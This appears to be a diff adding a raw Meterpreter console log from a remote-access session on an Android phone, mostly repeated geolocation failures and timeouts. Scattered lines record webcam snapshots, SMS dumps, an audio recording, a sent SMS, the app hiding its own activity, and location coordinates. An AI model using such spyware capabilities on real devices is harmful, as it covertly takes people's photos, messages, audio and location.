@@ -1,0 +1,147 @@
+49.7099861
+49.7099861
+49.7099861
+49.7099861
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+49.7099861
+49.7099861
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+49.7099861
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+49.7099861
+49.7099861
+49.7099861
+49.7099861
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+49.7099861
+49.7099861
+49.7099861
+49.7099861
+49.7099861
+49.7099861
+49.7099861[-] Unknown command: exploit.
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] Error running command dump_sms: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command dump_sms: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+
+[-] Error running command dump_sms: Rex::TimeoutError Operation timed out.
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] Error running command webcam_snap: Rex::TimeoutError Operation timed out.
+[-] android_geolocate: Operation failed: 1
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+[-] Error running command geolocate: Rex::TimeoutError Operation timed out.
+Webcam shot saved to: /root/django/users/administrator/webcamsnap2.jpg
+[-] android_geolocate: Operation failed: 1
+[*] SMS messages saved to: /root/django/users/administrator/dumpsms.txt
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[*] Activity MainActivity was hidden
+[+] SMS sent - Transmission successful
+Audio saved to: /root/django/Mwmthkdf.wav
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+
+
+[*] Activity MainActivity was hidden
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[*] Activity MainActivity was hidden
+50.026626
+50.0224549
+[*] SMS messages saved to: sms_dump_20190228124413.txt
+50.0221341
+
+[-] android_geolocate: Operation failed: 1
+
+meterpreter >
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+Webcam shot saved to: /root/django/users/administrator/webcamsnap1.jpeg
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[*] Activity MainActivity was hidden
+[-] android_geolocate: Operation failed: 1
+
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+[-] android_geolocate: Operation failed: 1
+
